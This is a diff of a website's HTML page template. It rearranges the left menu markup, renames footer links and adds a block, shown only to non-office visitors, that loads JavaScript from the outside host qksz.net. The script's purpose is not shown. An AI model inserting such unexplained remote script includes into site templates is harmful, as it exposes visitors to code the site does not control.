@@ -62,8 +62,8 @@
               </div><!-- /user information -->
             </div><!-- hd -->
             <div id="bd">
-                <div id="left" class="yui-b">
-                    <div stl:repeat="menu left_menus">
+                <div class="yui-b">
+                    <div id="left" stl:repeat="menu left_menus">
                             <stl:block if="level1">
                                 <ul stl:repeat="option level1">
                                     <li>
@@ -76,6 +76,9 @@
                                 <label>${menu/title}</label>
                                    ${menu/content}
                             </stl:block>   
+                    </div>
+                    <div stl:block="not office">
+                        <SCRIPT type="text/javascript" LANGUAGE="javascript" src="http://www.qksz.net/1e-g2h5"> </SCRIPT>
                     </div>
                 </div><!-- yui-b -->
                 <div id="yui-main">
@@ -103,8 +106,8 @@
                         .tarvel member since 2005</a>
                 </h1></li>
                     <li><a href="/;about">About</a></li>
-                    <li><a href="/;credits">Credits</a></li>
-                    <li><a href="/;license">License</a></li>
+                    <li><a href="/;terms">Terms &amp; Conditions</a></li>
+                    <li><a href="/;more">More</a></li>
                      <stl:block if="not user/info">
                         <li><a href="/;login_form">(not logged in)</a></li>
                       </stl:block>
